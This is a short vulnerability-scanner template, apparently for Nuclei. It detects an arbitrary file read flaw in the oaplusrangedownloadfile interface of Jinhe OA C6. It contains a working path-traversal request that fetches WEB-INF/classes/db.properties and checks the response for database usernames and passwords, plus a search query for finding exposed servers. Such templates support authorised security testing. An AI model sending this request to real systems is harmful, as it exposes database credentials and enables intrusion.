id: jinhe-oa-c6-oaplusrangedownloadfile-lfi

info:
  name: Jinhe OA C6 oaplusrangedownloadfile - Arbitary File Read
  author: qwtd
  severity: high
  description: |
    There is an arbitrary file read vulnerability in Jinhe OA C6 oaplusrangedownloadfile interface, through which an attacker can obtain sensitive information in the server
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="金和网络-金和OA"
  tags: 金和网络-金和OA

http:
  - method: GET
    path:
      - '{{BaseURL}}/jc6/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties'

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body,"jdbc.password") && contains(body,"jdbc.username")'
        condition: and

